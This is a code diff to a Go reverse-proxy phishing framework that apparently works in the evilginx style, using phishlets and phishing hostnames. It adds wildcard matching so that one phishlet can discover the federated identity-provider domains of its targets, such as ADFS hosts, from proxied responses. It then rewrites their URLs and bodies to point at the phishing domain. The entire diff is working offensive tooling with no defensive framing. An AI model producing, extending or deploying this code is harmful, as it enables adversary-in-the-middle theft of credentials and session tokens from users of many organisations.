@@ -96,6 +96,64 @@ type HttpProxy struct {
 	errorPageHtml     string
 	ip_mtx            sync.Mutex
 	session_mtx       sync.Mutex
+
+	// wildcardHosts maps "<phishletName>::<domainPattern>" -> concrete upstream
+	// domain, discovered at runtime from response bodies containing real
+	// federated-IdP hostnames. Per-proxy global with last-write-wins semantics.
+	wildcardHosts sync.Map
+}
+
+func (p *HttpProxy) wildcardKey(plName, pattern string) string {
+	return plName + "::" + pattern
+}
+
+func (p *HttpProxy) recordWildcard(plName, pattern, actual string) {
+	if pattern == "" || actual == "" {
+		return
+	}
+	actual = strings.ToLower(actual)
+	key := p.wildcardKey(plName, pattern)
+	if prev, ok := p.wildcardHosts.Load(key); !ok || prev.(string) != actual {
+		log.Debug("wildcard resolved: %s %s -> %s", plName, pattern, actual)
+	}
+	p.wildcardHosts.Store(key, actual)
+}
+
+func (p *HttpProxy) resolveWildcard(plName, pattern string) (string, bool) {
+	if v, ok := p.wildcardHosts.Load(p.wildcardKey(plName, pattern)); ok {
+		return v.(string), true
+	}
+	return "", false
+}
+
+// matchesOrigHost returns true if `hostname` equals the original-side hostname
+// of proxy host `ph` (exact match, or wildcard match when ph.domain == "*").
+// On wildcard match, the captured real domain is recorded in p.wildcardHosts.
+func (p *HttpProxy) matchesOrigHost(hostname, plName string, ph ProxyHost) bool {
+	hostname = strings.ToLower(hostname)
+	if ph.domain != "*" {
+		return hostname == combineHost(ph.orig_subdomain, ph.domain)
+	}
+	ok, captured := hostWildcardMatches(ph.orig_subdomain, "*", hostname)
+	if ok {
+		p.recordWildcard(plName, "*", captured)
+	}
+	return ok
+}
+
+// resolveProxyHostOrig returns the concrete original-side hostname for `ph`,
+// substituting the discovered wildcard domain if ph.domain == "*". Returns
+// ("", false) if wildcard hasn't been discovered yet.
+func (p *HttpProxy) resolveProxyHostOrig(plName string, ph ProxyHost) (string, bool) {
+	d := ph.domain
+	if d == "*" {
+		real, ok := p.resolveWildcard(plName, "*")
+		if !ok {
+			return "", false
+		}
+		d = real
+	}
+	return combineHost(ph.orig_subdomain, d), true
 }
 
 type ProxySession struct {
@@ -1507,10 +1565,22 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			if err == nil {
 				for site, pl := range p.cfg.phishlets {
 					if p.cfg.IsSiteEnabled(site) {
-						// handle sub_filters
-						sfs, ok := pl.subfilters[req_hostname]
-						if ok {
-							for _, sf := range sfs {
+						// handle sub_filters — collect matching filter sets, supporting
+						// wildcard `triggers_on` keys (e.g. "adfs.*").
+						var matchedSfs []SubFilter
+						if sfs, ok := pl.subfilters[req_hostname]; ok {
+							matchedSfs = append(matchedSfs, sfs...)
+						}
+						for key, sfs := range pl.subfilters {
+							if key == req_hostname || !strings.Contains(key, "*") {
+								continue
+							}
+							if subfilterKeyMatches(key, req_hostname) {
+								matchedSfs = append(matchedSfs, sfs...)
+							}
+						}
+						if len(matchedSfs) > 0 {
+							for _, sf := range matchedSfs {
 								var param_ok bool = true
 								if s, ok := p.sessions[ps.SessionId]; ok {
 									var params []string
@@ -1528,14 +1598,53 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 								}
 								if stringExists(mime, sf.mime) && (!sf.redirect_only || sf.redirect_only && redirect_set) && param_ok {
+									// If this sub_filter targets a wildcard origin domain,
+									// record the discovered real domain from the actual
+									// req_hostname so that subsequent reverse lookups work.
+									if sf.domain == "*" {
+										if ok2, captured := hostWildcardMatches(sf.subdomain, "*", req_hostname); ok2 {
+											p.recordWildcard(pl.Name, "*", captured)
+										}
+									}
+
 									re_s := sf.regexp
 									replace_s := sf.replace
-									phish_hostname, _ := p.replaceHostWithPhished(combineHost(sf.subdomain, sf.domain))
+
+									// Compute phish_hostname (phish side is always concrete).
+									var phish_hostname string
+									if sf.domain == "*" {
+										if pd, ok2 := p.cfg.GetSiteDomain(pl.Name); ok2 {
+											for _, ph := range pl.proxyHosts {
+												if ph.orig_subdomain == sf.subdomain && ph.domain == "*" {
+													phish_hostname = combineHost(ph.phish_subdomain, pd)
+													break
+												}
+											}
+										}
+									} else {
+										phish_hostname, _ = p.replaceHostWithPhished(combineHost(sf.subdomain, sf.domain))
+									}
 									phish_sub, _ := p.getPhishSub(phish_hostname)
 
-									re_s = strings.Replace(re_s, "{hostname}", regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain)), -1)
+									// {hostname} / {domain} regex expansion: for wildcard
+									// sf.domain, build a capturing regex that matches real
+									// federated hostnames instead of a literal "*".
+									var hostname_re, domain_re string
+									if sf.domain == "*" {
+										pre := ""
+										if sf.subdomain != "" {
+											pre = regexp.QuoteMeta(sf.subdomain) + `\.`
+										}
+										domain_re = `([A-Za-z0-9][A-Za-z0-9\-]*(?:\.[A-Za-z0-9][A-Za-z0-9\-]*)+)`
+										hostname_re = pre + domain_re
+									} else {
+										hostname_re = regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain))
+										domain_re = regexp.QuoteMeta(sf.domain)
+									}
+
+									re_s = strings.Replace(re_s, "{hostname}", hostname_re, -1)
 									re_s = strings.Replace(re_s, "{subdomain}", regexp.QuoteMeta(sf.subdomain), -1)
-									re_s = strings.Replace(re_s, "{domain}", regexp.QuoteMeta(sf.domain), -1)
+									re_s = strings.Replace(re_s, "{domain}", domain_re, -1)
 									re_s = strings.Replace(re_s, "{basedomain}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
 									re_s = strings.Replace(re_s, "{hostname_regexp}", regexp.QuoteMeta(regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain))), -1)
 									re_s = strings.Replace(re_s, "{subdomain_regexp}", regexp.QuoteMeta(sf.subdomain), -1)
@@ -1559,7 +1668,21 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									hint := extractLiteralHint(sf.regexp)
 									if hint == "" || bytes.Contains(body, []byte(hint)) {
 										if re, err := regexp.Compile(re_s); err == nil {
-											body = []byte(re.ReplaceAllString(string(body), replace_s))
+											if sf.domain == "*" {
+												plName := pl.Name
+												body = []byte(re.ReplaceAllStringFunc(string(body), func(m string) string {
+													sub := re.FindStringSubmatch(m)
+													for i := 1; i < len(sub); i++ {
+														if sub[i] != "" && strings.Contains(sub[i], ".") {
+															p.recordWildcard(plName, "*", strings.ToLower(sub[i]))
+															break
+														}
+													}
+													return re.ReplaceAllString(m, replace_s)
+												}))
+											} else {
+												body = []byte(re.ReplaceAllString(string(body), replace_s))
+											}
 										} else {
 											log.Error("regexp failed to compile: `%s`", sf.regexp)
 										}
@@ -1571,7 +1694,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						// handle auto filters (if enabled)
 						if stringExists(mime, p.auto_filter_mimes) {
 							for _, ph := range pl.proxyHosts {
-								if req_hostname == combineHost(ph.orig_subdomain, ph.domain) {
+								if p.matchesOrigHost(req_hostname, pl.Name, ph) {
 									if ph.auto_filter {
 										body = p.patchUrls(pl, body, CONVERT_TO_PHISHING_URLS)
 									}
@@ -2076,12 +2199,17 @@ func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
 		var sub_map map[string]string = make(map[string]string)
 		var hosts []string
 		for _, ph := range pl.proxyHosts {
+			origHost, origOk := p.resolveProxyHostOrig(pl.Name, ph)
+			if !origOk {
+				// wildcard not yet discovered; skip this proxy host for URL rewriting
+				continue
+			}
 			var h string
 			if c_type == CONVERT_TO_ORIGINAL_URLS {
 				h = combineHost(ph.phish_subdomain, phishDomain)
-				sub_map[h] = combineHost(ph.orig_subdomain, ph.domain)
+				sub_map[h] = origHost
 			} else {
-				h = combineHost(ph.orig_subdomain, ph.domain)
+				h = origHost
 				sub_map[h] = combineHost(ph.phish_subdomain, phishDomain)
 			}
 			hosts = append(hosts, h)
@@ -2309,7 +2437,7 @@ func (p *HttpProxy) getPhishletByOrigHost(hostname string) *Phishlet {
 	for site, pl := range p.cfg.phishlets {
 		if p.cfg.IsSiteEnabled(site) {
 			for _, ph := range pl.proxyHosts {
-				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
+				if p.matchesOrigHost(hostname, pl.Name, ph) {
 					return pl
 				}
 			}
@@ -2364,7 +2492,12 @@ func (p *HttpProxy) replaceHostWithOriginal(hostname string) (string, bool) {
 			}
 			for _, ph := range pl.proxyHosts {
 				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
-					return prefix + combineHost(ph.orig_subdomain, ph.domain), true
+					orig, ok := p.resolveProxyHostOrig(pl.Name, ph)
+					if !ok {
+						log.Debug("wildcard domain not yet resolved for %s (phish_sub=%s); cannot map phish->orig", pl.Name, ph.phish_subdomain)
+						continue
+					}
+					return prefix + orig, true
 				}
 			}
 		}
@@ -2388,10 +2521,10 @@ func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 				continue
 			}
 			for _, ph := range pl.proxyHosts {
-				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
+				if p.matchesOrigHost(hostname, pl.Name, ph) {
 					return prefix + combineHost(ph.phish_subdomain, phishDomain), true
 				}
-				if hostname == ph.domain {
+				if ph.domain != "*" && hostname == ph.domain {
 					return prefix + phishDomain, true
 				}
 			}
